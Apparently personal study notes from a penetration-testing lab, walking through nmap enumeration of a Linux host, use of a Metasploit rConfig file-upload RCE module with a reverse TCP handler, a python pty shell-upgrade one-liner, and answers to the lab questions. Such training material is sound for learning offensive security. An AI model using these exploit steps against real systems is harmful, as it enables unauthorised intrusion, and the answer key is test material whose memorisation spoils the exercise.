Things to consider when working with a Linux/Unix target: 
- What distro are they running?
- What shell and programming languages are currently on the system?
- What is the function of the server?
- What apps is it hosting?
- Are there any known vulnerabilities?

## Gaining a Shell

**Enumerating the Host w/ nmap:**

```shell-session
realCustampin@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT

```
- Based on our scan, what services do we see that are running?
	- MySQL
	- FTP
	- HTTP
	- HTTPS
- Based on the information directly above, we can safely assume that the target is hosting a web application. 
- We should also give the page a look prior to making a decision on the angle of attack. 

**Vulnerable Web Application Discovery:**

![[Pasted image 20251023195920.png]]
- We can see that the web app that is running is called rConfig. Let's look for some vulnerabilities that are tied to this application. Notice the version at the bottom of the page too. VALUABLE INFORMATION!!! 
- A quick google search shows that there is an exploit for that specific version of rConfig. 

**Searching for a Module via Metasploit:**
```shell-session
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution
```
- We can see that there is not an exploit popping up for rConfig 3.6.9, however we can still use the internet to download the exploit from github and upload it to the following file path on our attacking host: 
	- `/usr/share/metasploit-framework/modules/exploits/linux/http`
- It is good knowledge to know the exploit modules are also in the following directory: 
	- `/usr/share/metasploit-framework/modules/exploits`

## Using the rConfig Exploit and Gaining a Shell

```shell-session
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```
- We are now wanting to use the exploit that we just put into the folder. 
- Fill out the options accordingly

**Execute the Exploit:**

```shell-session
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)

## Spawning a TTY Shell w/ Python
- If we gain a shell on a target, however there is no TTY, we can spawn a shell using the following python one-liner:

```bash
	python -c 'import pty; pty.spawn("/bin/bash")'
	  ```

## Lab Questions: 

Target IP: 10.129.220.95

1. What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?
	1. php
2. Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.
	1. edgereouter-isp
